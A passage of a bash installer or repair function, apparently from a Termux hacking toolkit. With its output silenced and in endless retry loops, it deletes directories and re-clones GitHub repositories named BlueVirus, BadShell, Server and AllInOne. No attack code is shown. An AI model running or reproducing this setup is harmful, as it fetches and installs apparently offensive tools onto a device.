FIX_ALL(){
#--------------------------------------------------------------------
	if [[ -d $PREFIX/etc/Hacked/Server ]];then
		rm -rfd $PREFIX/etc/Hacked/Server &>> /dev/null
	fi
		while true;do
			cd $PREFIX/etc/Hacked/
			git clone https://github.com/blue24bluer/Server &>> /dev/null
			if [[ $? == "0" ]];then
				break
			fi
		done
#--------------------------------------------------------------------
	if [[ -d $PREFIX/etc/Hacked/BlueVirus ]];then
		rm -rfd $PREFIX/etc/Hacked/BlueVirus &>> /dev/null
	fi
		while true;do
			cd $PREFIX/etc/Hacked/
			git clone https://github.com/blue24bluer/BadShell_B24B &>> /dev/null # change the name of tool
			if [[ $? == "0" ]];then
				mv BadShell_B24B BlueVirus
				break
			fi
		done
#--------------------------------------------------------------------
	if [[ -d $PREFIX/etc/Hacked/Badshell ]];then
		rm -rfd $PREFIX/etc/Hacked/Badshell &>> /dev/null
	fi

		while true;do
			git clone https://github.com/blue24bluer/Badshell &>> /dev/null
			if [[ $? == "0" ]];then
				break
			fi
			Rebulid &>> /dev/null
		done
#--------------------------------------------------------------------
        if [[ -d $PREFIX/etc/B24B/blue24bluer ]];then
                rm -rfd $PREFIX/etc/B24B/blue24bluer/AllInOne &>> /dev/null
        fi

                while true;do
			cd $PREFIX/etc/B24B/blue24bluer
                        git clone https://github.com/blue24bluer/AllInOne &>> /dev/null
                        if [[ $? == "0" ]];then
				mv $PREFIX/etc/B24B/blue24bluer/AllInOne/AllInOne $PREFIX/etc/B24B/blue24bluer/AllInOne.file
				rm -rfd $PREFIX/etc/B24B/blue24bluer/AllInOne
				mv $PREFIX/etc/B24B/blue24bluer/AllInOne.file $PREFIX/etc/B24B/blue24bluer/AllInOne
                                break
                        fi
                        Rebulid &>> /dev/null
                done
#--------------------------------------------------------------------
        if [[ -d $PREFIX/etc/Hacked/stutus ]];then
                rm -rfd $PREFIX/etc/Hacked/stutus &>> /dev/null
        fi

